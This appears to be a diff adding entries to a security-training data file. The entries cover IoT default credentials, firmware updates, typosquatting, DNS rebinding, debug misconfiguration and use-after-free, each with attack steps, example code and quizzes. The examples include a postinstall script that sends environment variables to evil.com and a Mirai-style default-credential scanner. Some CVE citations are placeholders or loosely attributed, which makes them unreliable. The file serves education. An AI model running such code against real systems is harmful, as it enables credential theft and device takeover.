+          "What actions each service account/user can perform within the cluster",
+          "Network bandwidth between pods",
+          "Container image vulnerability scanning",
+          "DNS resolution inside the cluster"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why is binding cluster-admin to a default service account dangerous?",
+        "options": [
+          "Any pod using that default account inherits full cluster-admin rights if compromised",
+          "It only affects logging verbosity",
+          "It is required for Kubernetes to function at all",
+          "It has no real security impact in modern clusters"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's the recommended RBAC practice in Kubernetes?",
+        "options": [
+          "Apply least-privilege roles scoped narrowly to specific namespaces and resources",
+          "Grant cluster-admin broadly for operational simplicity",
+          "Disable RBAC entirely to avoid configuration errors",
+          "Use the same service account for every workload"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Default IoT Credentials",
+    "category": "IoT",
+    "severity": "Critical",
+    "definition": "IoT devices ship with factory-default usernames and passwords that are never changed by users or administrators, allowing trivial remote takeover.",
+    "theory": "Manufacturers often use identical, publicly documented default credentials (admin/admin, root/12345) across entire product lines. Attackers maintain databases of these defaults and scan the internet for exposed devices, compromising them en masse — the basis of botnets like Mirai.",
+    "cve": "CVE-2016-? (Mirai botnet — exploited default Telnet credentials across IoT devices)",
+    "exploit": "1. Scan IP ranges for devices with open management ports (Telnet/SSH/web admin).\n2. Attempt a known list of default credentials for the identified device type/vendor.\n3. If successful, gain full control — used historically to build massive botnets (Mirai).",
+    "example": {
+      "scenario": "A home security camera is sold with the default login 'admin/admin' which the vast majority of customers never change; an internet-wide scanning botnet automatically finds and compromises hundreds of thousands of identical cameras within days of a model's release, just like the Mirai botnet did in 2016.",
+      "code": "# Attacker mass-scanning script (conceptual, as used by Mirai-style botnets)\nfor ip in internet_ip_range:\n    try:\n        telnet_login(ip, 'admin', 'admin')\n        telnet_login(ip, 'root', '12345')\n        # ...dozens more known IoT default credential pairs\n    except: continue\n    # On success: device is added to the botnet"
+    },
+    "mitigation": "Force unique credential setup on first use, disable default accounts, require firmware updates that enforce password changes.",
+    "quizzes": [
+      {
+        "question": "What made the Mirai botnet so effective?",
+        "options": [
+          "It scanned the internet for IoT devices still using factory-default credentials",
+          "It exploited a zero-day in TLS",
+          "It used social engineering against device manufacturers",
+          "It targeted only desktop computers"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's the most effective fix for the default-credentials problem?",
+        "options": [
+          "Force users to set a unique password during initial device setup, with no usable default",
+          "Document the default password more clearly in the manual",
+          "Use a longer default password",
+          "Disable the device's network features entirely"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why do default credentials scale into such large-scale compromises?",
+        "options": [
+          "The same credentials are reused across entire product lines, and most users never change them",
+          "Default credentials are encrypted and cannot be exploited",
+          "They only affect one device at a time with no automation possible",
+          "Manufacturers patch them within hours of shipping"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Insecure Firmware Update Mechanism",
+    "category": "IoT",
+    "severity": "Critical",
+    "definition": "An IoT device accepts firmware updates without verifying their authenticity or integrity, letting an attacker push malicious firmware that persists even after a factory reset.",
+    "theory": "If firmware updates aren't cryptographically signed and verified, or are delivered over unencrypted channels, an attacker who can intercept network traffic or access the update mechanism can install malicious firmware — gaining persistent, low-level control of the device that survives reboots and resets.",
+    "cve": "CVE-2019-9579 (various IoT firmware signature validation bypass cases)",
+    "exploit": "1. Intercept the device's firmware update process (e.g. via a MITM position on the local network or by analyzing the update server protocol).\n2. If updates aren't signed/verified, craft a malicious firmware image and serve it during an update check.\n3. Device installs it, granting the attacker persistent root-level control.",
+    "example": {
+      "scenario": "A smart thermostat checks for firmware updates over plain HTTP and never verifies a cryptographic signature on the downloaded image; an attacker positioned on the same network performs a man-in-the-middle attack, serving a backdoored firmware image that the device installs without complaint.",
+      "code": "// Vulnerable firmware update check (device-side, simplified)\nGET http://updates.vendor.com/firmware/latest.bin   // plain HTTP, no signature check\n// Device flashes whatever .bin file it receives with no validation\n\n// Attacker MITM response (intercepted on local network)\nHTTP/1.1 200 OK\nContent-Type: application/octet-stream\n<malicious-backdoored-firmware-bytes>"
+    },
+    "mitigation": "Sign firmware images cryptographically, verify signatures before flashing, deliver updates over authenticated/encrypted channels (HTTPS with certificate pinning).",
+    "quizzes": [
+      {
+        "question": "What's the core flaw in an insecure firmware update mechanism?",
+        "options": [
+          "The device installs firmware without verifying its cryptographic authenticity/integrity",
+          "The firmware file is too large",
+          "Updates happen too frequently",
+          "The device has too much storage"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why is malicious firmware especially dangerous compared to a typical software exploit?",
+        "options": [
+          "It can persist at a low level and survive factory resets or reboots",
+          "It only affects the device's display",
+          "It can be removed by simply restarting the device",
+          "It only works while connected to the internet"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's the correct mitigation for insecure firmware updates?",
+        "options": [
+          "Cryptographically sign firmware and verify the signature before installation",
+          "Distribute firmware over email attachments",
+          "Allow any file to be flashed for flexibility",
+          "Disable update checks entirely"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Typosquatting Package Attack",
+    "category": "Supply Chain",
+    "severity": "High",
+    "definition": "An attacker publishes a malicious package with a name very similar to a popular legitimate package, hoping developers mistype the name during installation.",
+    "theory": "Package registries (npm, PyPI) allow anyone to publish under any unclaimed name. Attackers register names that are one character off from popular packages (e.g. 'reqeusts' instead of 'requests', 'crossenv' instead of 'cross-env'), embedding malicious code that runs on install via lifecycle hooks.",
+    "cve": "Multiple documented npm/PyPI typosquatting campaigns (e.g. 'crossenv' npm incident, 2017)",
+    "exploit": "1. Identify a popular package name.\n2. Register slight misspellings/variations on the same registry.\n3. Embed a malicious install script (postinstall hook) that exfiltrates environment variables or installs a backdoor.\n4. Wait for developers to mistype the package name during npm install / pip install.",
+    "example": {
+      "scenario": "An attacker publishes an npm package named 'expres' (missing the second 's' from the popular 'express' framework) containing a malicious postinstall script; developers who mistype the install command unknowingly run code that exfiltrates their environment variables, including cloud credentials, straight to the attacker.",
+      "code": "// Malicious package.json of the typosquatted package\n{\n  \"name\": \"expres\",\n  \"scripts\": {\n    \"postinstall\": \"node steal.js\"\n  }\n}\n\n// steal.js — runs automatically on `npm install expres`\nrequire('https').request('https://evil.com/collect', { method: 'POST' })\n  .end(JSON.stringify(process.env)); // exfiltrates all environment variables, including secrets"
+    },
+    "mitigation": "Double-check package names before installing, use lockfiles, enable registry-side typosquat detection, vet packages before adding to dependencies.",
+    "quizzes": [
+      {
+        "question": "Typosquatting attacks rely on what mistake by the victim?",
+        "options": [
+          "Mistyping a popular package name during installation",
+          "Using an outdated browser",
+          "Clicking a phishing email link",
+          "Reusing a weak password"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What mechanism commonly delivers the malicious payload once a typosquatted package is installed?",
+        "options": [
+          "A postinstall lifecycle script that runs automatically",
+          "A manually executed binary the user must run separately",
+          "An email sent after installation",
+          "A browser extension"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's a practical defense against typosquatting attacks?",
+        "options": [
+          "Carefully verify package names and use lockfiles to pin exact, reviewed dependencies",
+          "Always install the newest version of any similarly-named package",
+          "Disable package manager security features",
+          "Avoid using any third-party packages ever"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "DNS Rebinding",
+    "category": "Infrastructure",
+    "severity": "High",
+    "definition": "An attacker-controlled DNS server changes the IP address a domain resolves to after the browser's initial security check, allowing JavaScript to bypass same-origin restrictions and reach internal network services.",
+    "theory": "A victim's browser loads a page from attacker.com (resolving to a public IP), but the attacker's DNS server then changes that same domain's resolution to an internal IP (like 192.168.1.1). Because the browser still considers it the 'same origin', the attacker's JavaScript can now make requests to internal network devices that should never be reachable from the internet.",
+    "cve": "Various router/IoT device exploitation chains using DNS rebinding documented by security researchers",
+    "exploit": "1. Victim visits attacker.com, which resolves to a public IP with a very short DNS TTL.\n2. Attacker's DNS server quickly changes the record to an internal IP (e.g. the victim's router at 192.168.0.1).\n3. The page's JavaScript, still considered same-origin, now sends requests that actually reach the victim's internal router or IoT devices.",
+    "example": {
+      "scenario": "An attacker hosts a page that initially resolves to their own server, then rapidly reconfigures their DNS to point the same hostname at the victim's home router's internal IP address; the page's JavaScript — still trusted as same-origin by the browser — then issues requests that reconfigure the victim's actual router.",
+      "code": "// Attacker's DNS server config (very short TTL, then changes the A record)\nevil.com.  1  IN  A  203.0.113.5   // initial: attacker's public server\n// ...60 seconds later, attacker flips the DNS record...\nevil.com.  1  IN  A  192.168.0.1   // victim's internal router\n\n// Page JS, still considered same-origin by the browser\nfetch('http://evil.com/setDNS?server=attacker-dns')  // now actually hits the victim's router"
+    },
+    "mitigation": "Validate the Host header server-side, pin DNS resolutions, reject requests where the resolved IP is in a private/internal range, use DNS rebinding protection on internal services.",
+    "quizzes": [
+      {
+        "question": "DNS rebinding exploits a change in what, after the browser's initial trust decision?",
+        "options": [
+          "The IP address a domain resolves to",
+          "The page's HTML content",
+          "The TLS certificate's expiry date",
+          "The browser's user agent string"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What does DNS rebinding ultimately let an attacker's JavaScript reach?",
+        "options": [
+          "Internal network services/devices that should not be reachable from the internet",
+          "Only the attacker's own server",
+          "The browser's password manager",
+          "The operating system's kernel directly"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's an effective server-side defense against DNS rebinding attacks targeting internal services?",
+        "options": [
+          "Validate the Host header and reject requests resolving to unexpected/internal IP ranges",
+          "Increase the DNS TTL to a very large value",
+          "Disable HTTPS for internal services",
+          "Allow all incoming Host headers"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Server Misconfiguration (Debug Mode & Default Files Exposed)",
+    "category": "Infrastructure",
+    "severity": "High",
+    "definition": "A production server is left running with debug mode enabled, default/sample files present, or verbose error pages exposed, leaking internal details or providing direct attack footholds.",
+    "theory": "Frameworks often ship with debug consoles, sample admin pages, or default credentials meant only for development. If these aren't disabled or removed before going to production, they expose stack traces, environment variables, or even an interactive code execution console directly to attackers.",
+    "cve": "CVE-2015-5076 (Django debug mode information disclosure issues), CVE-2018-7600 (Drupalgeddon2)",
+    "exploit": "1. Trigger an application error (malformed input, invalid route) and observe the response.\n2. If a detailed stack trace or framework debug page appears, it may expose file paths, environment variables, or even an interactive debugger.\n3. Also check for leftover default files (e.g. /phpinfo.php, /admin/install.php) that frameworks ship with during setup.",
+    "example": {
+      "scenario": "A Django application is accidentally deployed to production with DEBUG=True still set; visiting any URL that triggers an unhandled exception returns a full interactive traceback page exposing database credentials, secret keys, and an interactive Python console that an attacker can use to execute arbitrary code.",
+      "code": "# Vulnerable production settings.py\nDEBUG = True  # never disabled before deployment\n\n// Attacker triggers any error, e.g. requesting a non-existent route with bad input\nGET /nonexistent?param=' OR 1=1\n// Response: full Django debug page with settings.py contents, env vars,\n// and an interactive traceback console embedded in the HTML"
+    },
+    "mitigation": "Disable debug mode in production, remove default/sample files before deployment, use generic error pages, automate configuration audits in CI/CD.",
+    "quizzes": [
+      {
+        "question": "Why is leaving debug mode enabled in production dangerous?",
+        "options": [
+          "It can expose stack traces, secrets, environment variables, or even an interactive debug console",
+          "It only affects page load speed",
+          "It disables the database connection",
+          "It has no security relevance, only cosmetic differences"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What kind of leftover files are commonly exploited in server misconfiguration attacks?",
+        "options": [
+          "Default/sample setup files like phpinfo.php or install wizards left on the production server",
+          "User profile pictures",
+          "CSS stylesheets",
+          "Favicon files"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's a good practice to catch these misconfigurations before they reach production?",
+        "options": [
+          "Automate configuration audits/checks as part of the CI/CD deployment pipeline",
+          "Manually check the server once a year",
+          "Rely solely on developers remembering to disable debug mode",
+          "Enable debug mode permanently for easier support"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Use-After-Free",
+    "category": "Memory Safety",
+    "severity": "Critical",
+    "definition": "A program continues to use a pointer to memory after that memory has been freed, leading to undefined behavior that attackers can exploit for code execution.",
+    "theory": "In unsafe languages (C/C++), freeing memory doesn't erase the pointer referencing it (a 'dangling pointer'). If that memory is reallocated for attacker-controlled data before the original pointer is used again, the program ends up reading or executing attacker-controlled content, often leading to remote code execution in browsers and other complex native software.",
+    "cve": "CVE-2021-21224 (Chrome V8 use-after-free RCE)",
+    "exploit": "1. Find a code path where an object is freed but a reference to it is used later.\n2. Trigger an allocation of attacker-controlled data that reuses that same freed memory slot (heap grooming).\n3. When the dangling pointer is used again, it now points to attacker-controlled data, often achieving code execution.",
+    "example": {
+      "scenario": "A browser's JavaScript engine frees an object when a certain DOM element is removed, but a callback still holds a reference to it; an attacker times a heap allocation to reuse that exact freed memory slot with crafted data, then triggers the dangling callback to gain code execution inside the browser.",
+      "code": "// Vulnerable C++ pattern (simplified)\nWidget* w = new Widget();\ndelete w;          // memory freed, but pointer 'w' still exists (dangling)\n// ... attacker-controlled allocation reuses the same freed memory slot ...\nw->doSomething();  // use-after-free: now operates on attacker-controlled data"
+    },
+    "mitigation": "Use memory-safe languages where possible, smart pointers / RAII in C++, set pointers to null after freeing, use sanitizers (ASan) during development.",
+    "quizzes": [
+      {
+        "question": "A use-after-free bug occurs when a program does what?",
+        "options": [
+          "Continues to use a pointer after the memory it references has been freed",
+          "Allocates too much memory at once",
+          "Reads a file that doesn't exist",
+          "Uses an expired TLS session"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What technique do attackers use to control the contents of memory that will be reused after a free?",
+        "options": [
+          "Heap grooming — carefully timing allocations to land attacker-controlled data in the freed slot",
+          "SQL injection",
+          "DNS spoofing",
+          "Phishing"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Which practice in C++ helps prevent use-after-free bugs?",
+        "options": [
+          "Using smart pointers / RAII patterns instead of manual new/delete",
+          "Always allocating maximum possible memory upfront",
+          "Disabling garbage collection",
+          "Avoiding pointers entirely is the only fix and impossible in C++"
         ],
         "answer": 0
       }
